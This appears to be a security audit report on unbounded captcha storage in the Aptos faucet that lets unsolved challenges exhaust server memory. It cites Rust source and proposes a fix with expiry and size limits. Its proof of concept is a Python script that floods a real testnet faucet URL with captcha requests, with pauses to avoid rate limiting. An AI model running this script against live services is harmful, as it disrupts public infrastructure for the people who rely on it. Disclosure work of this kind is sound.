# Audit Report

## Title
Unbounded Memory Growth DoS in Faucet Captcha Manager Enables Service Disruption

## Summary
The `CaptchaManager` in the Aptos faucet lacks expiration and size limit mechanisms for stored captcha challenges, allowing an attacker to exhaust server memory by repeatedly requesting captchas without solving them. While the `Arc<Mutex<CaptchaManager>>` synchronization itself is correctly implemented, the absence of cleanup logic creates a resource exhaustion vulnerability.

## Finding Description

The Arc<Mutex<>> synchronization pattern is properly implemented—all HashMap access is protected by the mutex, locks are correctly scoped, and there are no data races from a Rust safety perspective. [1](#0-0) [2](#0-1) 

However, the code contains an explicit warning about a critical resource management flaw: [3](#0-2) 

The vulnerability stems from the implementation of captcha lifecycle management:

1. **Challenge Creation** adds entries without bounds checking: [4](#0-3) 

2. **Challenge Verification** only removes entries on correct answers: [5](#0-4) 

3. **No Cleanup Mechanism** exists—there are only three HashMap operations throughout the entire codebase:
   - `insert()` on challenge creation
   - `get()` on validation  
   - `remove()` only on successful validation

An attacker can exploit this by:
1. Repeatedly calling `/request_captcha` endpoint
2. Never submitting solutions via `/fund` endpoint
3. Each call adds a new entry to the unbounded HashMap
4. Memory grows until the faucet server experiences OOM and crashes

This breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits."

## Impact Explanation

**Medium Severity** per Aptos Bug Bounty criteria:

- **Service Disruption**: The faucet is a critical infrastructure component for developer onboarding and testnet access. Its unavailability directly impacts ecosystem usability.
- **State Inconsistencies Requiring Intervention**: OOM crashes require manual server restart and potential state cleanup.
- **Validator Node Impact**: While the faucet is separate from validators, this demonstrates a pattern of unbounded resource growth that could affect other services if similar patterns exist elsewhere.

This maps to Medium severity: "State inconsistencies requiring intervention" and potentially High severity: "API crashes."

## Likelihood Explanation

**High Likelihood**:

- **Zero Authentication Required**: The `/request_captcha` endpoint has no authentication when the TapCaptchaChecker is enabled [6](#0-5) 

- **Trivial Exploitation**: A simple script making HTTP GET requests can trigger the attack
- **No Rate Limiting**: While rate limiters may be configured, they typically allow bursts that could accumulate thousands of challenges
- **Known Issue**: The warning comment indicates developers are aware but haven't implemented mitigations

## Recommendation

Implement a multi-layered defense strategy:

1. **Add TTL-based expiration**: Store challenges with timestamps and implement periodic cleanup
2. **Enforce size limits**: Reject new challenges when HashMap exceeds a threshold
3. **Implement LRU eviction**: Automatically remove oldest challenges when at capacity

**Recommended Implementation**:

```rust
use std::time::{SystemTime, UNIX_EPOCH};

pub struct CaptchaManager {
    challenges: HashMap<u32, ChallengeData>,
    max_size: usize,           // e.g., 10000
    ttl_seconds: u64,          // e.g., 300 (5 minutes)
}

struct ChallengeData {
    value: String,
    created_at: u64,
}

impl CaptchaManager {
    pub fn create_challenge(&mut self) -> Result<(u32, Vec<u8>)> {
        // Clean expired challenges first
        self.cleanup_expired();
        
        // Enforce size limit
        if self.challenges.len() >= self.max_size {
            bail!("Too many pending challenges, please try again later");
        }
        
        let key = rand::thread_rng().gen_range(0, u32::MAX - 1);
        let (name, image) = /* ... captcha generation ... */;
        
        let now = SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs();
        self.challenges.insert(key, ChallengeData {
            value: name,
            created_at: now,
        });
        
        Ok((key, image))
    }
    
    fn cleanup_expired(&mut self) {
        let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs();
        self.challenges.retain(|_, data| {
            now - data.created_at < self.ttl_seconds
        });
    }
}
```

Additionally, implement a periodic task using the existing infrastructure: [7](#0-6) 

## Proof of Concept

```python
#!/usr/bin/env python3
import requests
import time

# Target faucet endpoint
FAUCET_URL = "http://faucet.testnet.aptoslabs.com/request_captcha"

# Attack: Request captchas without solving them
def oom_attack(num_requests=10000):
    print(f"Starting OOM attack with {num_requests} captcha requests...")
    
    for i in range(num_requests):
        try:
            response = requests.get(FAUCET_URL)
            if response.status_code == 200:
                captcha_key = response.headers.get('CAPTCHA_KEY')
                print(f"[{i+1}] Created challenge with key: {captcha_key}")
            else:
                print(f"[{i+1}] Failed: {response.status_code}")
        except Exception as e:
            print(f"[{i+1}] Error: {e}")
            
        # Small delay to avoid network-level rate limiting
        if i % 100 == 0:
            time.sleep(0.1)
    
    print(f"Attack complete. {num_requests} challenges created and never solved.")
    print("Server memory usage should now be significantly elevated.")

if __name__ == "__main__":
    oom_attack()
```

**Expected Result**: After executing this script with sufficient iterations, the faucet server's memory usage grows unbounded, eventually leading to OOM crash and service disruption.

## Notes

The `Arc<Mutex<CaptchaManager>>` synchronization is correctly implemented using `futures::lock::Mutex` with proper locking patterns. The vulnerability is not a concurrency issue but a resource management failure that allows unbounded memory growth through the synchronized interface.

### Citations

**File:** crates/aptos-faucet/core/src/endpoints/captcha.rs (L17-20)
```rust
pub struct CaptchaApi {
    pub enabled: bool,
    pub captcha_manager: Arc<Mutex<CaptchaManager>>,
}
```

**File:** crates/aptos-faucet/core/src/endpoints/captcha.rs (L40-47)
```rust
    async fn request_captcha(&self) -> Result<Response<Binary<Vec<u8>>>, AptosTapErrorResponse> {
        if !self.enabled {
            return Err(AptosTapError::new(
                "The CaptchaChecker is not enabled".to_string(),
                AptosTapErrorCode::EndpointNotEnabled,
            )
            .into());
        }
```

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L4-6)
```rust
//! Warning: This could be attacked and cause the server to OOM because we
//! don't throw out captchas info if it has been sitting there for too long /
//! the map grows too large.
```

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L126-131)
```rust
pub struct CaptchaManager {
    /// When a challenge is created, we return to the client the captcha itself
    /// and a random key they must make the second request with. This is a map
    /// from that random key to the value of the captcha.
    challenges: HashMap<u32, String>,
}
```

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L142-162)
```rust
    pub fn create_challenge(&mut self) -> Result<(u32, Vec<u8>)> {
        // Generate a random key.
        let key = rand::thread_rng().gen_range(0, u32::MAX - 1);

        // Generate a captcha.
        let (name, image) = Captcha::new()
            .add_chars(5)
            .apply_filter(Noise::new(0.4))
            .apply_filter(Wave::new(4.0, 6.0).vertical())
            .apply_filter(Wave::new(3.0, 2.0).horizontal())
            .apply_filter(Grid::new(10, 6))
            .apply_filter(Dots::new(8))
            .as_tuple()
            .context("Failed to generate captcha")?;

        // Store the captcha information.
        self.challenges.insert(key, name);

        // Return (key, <captcha as base64>).
        Ok((key, image))
    }
```

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L165-177)
```rust
    pub fn check_challenge(&mut self, key: u32, value: &str) -> Result<bool> {
        match self.challenges.get(&key) {
            Some(captcha) => {
                if captcha == value {
                    self.challenges.remove(&key);
                    Ok(true)
                } else {
                    Ok(false)
                }
            },
            None => bail!("Captcha key unknown: {}", key),
        }
    }
```

**File:** crates/aptos-faucet/core/src/checkers/mod.rs (L69-77)
```rust
    /// This function will be called once at startup. In it, the trait implementation
    /// should spawn any periodic tasks that it wants and return handles to them.
    /// If tasks want to signal that there is an issue, all they have to do is return.
    /// If the task wants to tolerate some errors, e.g. only cause the process to die
    /// if the task has failed n times, it must handle that itself and only return
    /// when it wants this to happen.
    // Sadly we can't use ! here yet: https://github.com/rust-lang/rust/issues/35121.
    fn spawn_periodic_tasks(&self, _join_set: &mut JoinSet<anyhow::Result<()>>) {}
}
```
